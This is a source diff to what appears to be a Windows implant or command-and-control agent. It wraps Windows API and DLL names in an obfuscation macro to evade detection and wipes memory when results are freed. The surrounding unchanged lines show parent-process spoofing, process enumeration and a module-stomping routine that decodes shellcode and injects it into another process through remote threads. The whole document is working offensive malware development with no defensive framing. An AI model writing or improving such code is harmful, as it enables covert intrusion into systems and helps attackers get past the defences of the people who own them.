@@ -16,6 +16,7 @@
  *   whoami   — return hostname\username + admin status
  */
 #include "../include/implant.h"
+#include "../include/obfstr.h"
 #include <string.h>
 
 /* PPID spoof: stored globally, applied in _CreateProcessWithPPID */
@@ -40,7 +41,11 @@ static AgentResult *ErrorResult(const AgentCommand *cmd, const char *msg) {
 
 void FreeResult(AgentResult *r) {
     if (!r) return;
-    ImplantFree(r->output);
+    if (r->output) {
+        SecureZero(r->output, strlen(r->output));
+        ImplantFree(r->output);
+    }
+    SecureZero(r, sizeof(*r));
     ImplantFree(r);
 }
 
@@ -75,14 +80,14 @@ static BOOL _CreateProcessWithPPID(const char *cmd,
 
     if (usePPID) {
         pInit = (pfnInitializeProcThreadAttributeList)(FARPROC)
-            GetProcAddress(GetModuleHandleA("kernel32.dll"),
-                           "InitializeProcThreadAttributeList");
+            GetProcAddress(GetModuleHandleA(OBFSTR("kernel32.dll")),
+                           OBFSTR("InitializeProcThreadAttributeList"));
         pUpd  = (pfnUpdateProcThreadAttribute)(FARPROC)
-            GetProcAddress(GetModuleHandleA("kernel32.dll"),
-                           "UpdateProcThreadAttribute");
+            GetProcAddress(GetModuleHandleA(OBFSTR("kernel32.dll")),
+                           OBFSTR("UpdateProcThreadAttribute"));
         pDel  = (pfnDeleteProcThreadAttributeList)(FARPROC)
-            GetProcAddress(GetModuleHandleA("kernel32.dll"),
-                           "DeleteProcThreadAttributeList");
+            GetProcAddress(GetModuleHandleA(OBFSTR("kernel32.dll")),
+                           OBFSTR("DeleteProcThreadAttributeList"));
 
         if (pInit && pUpd && pDel) {
             pInit(NULL, 0, 1, &attrSize);
@@ -183,13 +188,13 @@ static AgentResult *CmdPS(const AgentCommand *cmd) {
     typedef BOOL   (WINAPI *pfnProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
     typedef BOOL   (WINAPI *pfnProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
 
-    HMODULE k32 = GetModuleHandleA("kernel32.dll");
+    HMODULE k32 = GetModuleHandleA(OBFSTR("kernel32.dll"));
     pfnCreateToolhelp32Snapshot pSnap =
-        (pfnCreateToolhelp32Snapshot)(FARPROC)GetProcAddress(k32, "CreateToolhelp32Snapshot");
+        (pfnCreateToolhelp32Snapshot)(FARPROC)GetProcAddress(k32, OBFSTR("CreateToolhelp32Snapshot"));
     pfnProcess32FirstW pFirst =
-        (pfnProcess32FirstW)(FARPROC)GetProcAddress(k32, "Process32FirstW");
+        (pfnProcess32FirstW)(FARPROC)GetProcAddress(k32, OBFSTR("Process32FirstW"));
     pfnProcess32NextW pNext =
-        (pfnProcess32NextW)(FARPROC)GetProcAddress(k32, "Process32NextW");
+        (pfnProcess32NextW)(FARPROC)GetProcAddress(k32, OBFSTR("Process32NextW"));
 
     if (!pSnap || !pFirst || !pNext)
         return ErrorResult(cmd, "Toolhelp32 unavailable");
@@ -517,7 +522,7 @@ static AgentResult *CmdStomp(const AgentCommand *cmd) {
     ImplantFree(pidStr);
 
     /* Default sacrificial DLL — small, always present on Win10+, rarely loaded */
-    const char *sacDLL = (dllName && dllName[0]) ? dllName : "xpsservices.dll";
+    const char *sacDLL = (dllName && dllName[0]) ? dllName : OBFSTR("xpsservices.dll");
 
     /* Decode shellcode */
     int scB64Len = (int)strlen(scB64);
@@ -540,7 +545,7 @@ static AgentResult *CmdStomp(const AgentCommand *cmd) {
     NtWrite(hProc, pathRemote, (PVOID)sacDLL, pathLen);
 
     /* Get LoadLibraryA address (same in all processes — ASLR is per-boot, not per-process) */
-    PVOID pLoadLib = (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+    PVOID pLoadLib = (PVOID)GetProcAddress(GetModuleHandleA(OBFSTR("kernel32.dll")), OBFSTR("LoadLibraryA"));
     HANDLE hLLThread = NULL;
     NtCreateThread(hProc, pLoadLib, pathRemote, &hLLThread);
     if (hLLThread) {
@@ -555,14 +560,14 @@ static AgentResult *CmdStomp(const AgentCommand *cmd) {
      * EnumProcessModules on the target to find the module. */
     typedef BOOL (WINAPI *pfnEnumProcMods)(HANDLE, HMODULE*, DWORD, LPDWORD);
     typedef BOOL (WINAPI *pfnGetModFileNameExA)(HANDLE, HMODULE, LPSTR, DWORD);
-    HMODULE psapi = LoadLibraryA("psapi.dll");
+    HMODULE psapi = LoadLibraryA(OBFSTR("psapi.dll"));
     PVOID stompBase = NULL;
     DWORD stompTextSize = 0;
     DWORD stompTextRVA  = 0;
 
     if (psapi) {
-        pfnEnumProcMods pEnum = (pfnEnumProcMods)(FARPROC)GetProcAddress(psapi, "EnumProcessModules");
-        pfnGetModFileNameExA pName = (pfnGetModFileNameExA)(FARPROC)GetProcAddress(psapi, "GetModuleFileNameExA");
+        pfnEnumProcMods pEnum = (pfnEnumProcMods)(FARPROC)GetProcAddress(psapi, OBFSTR("EnumProcessModules"));
+        pfnGetModFileNameExA pName = (pfnGetModFileNameExA)(FARPROC)GetProcAddress(psapi, OBFSTR("GetModuleFileNameExA"));
 
         if (pEnum && pName) {
             HMODULE mods[512]; DWORD needed = 0;
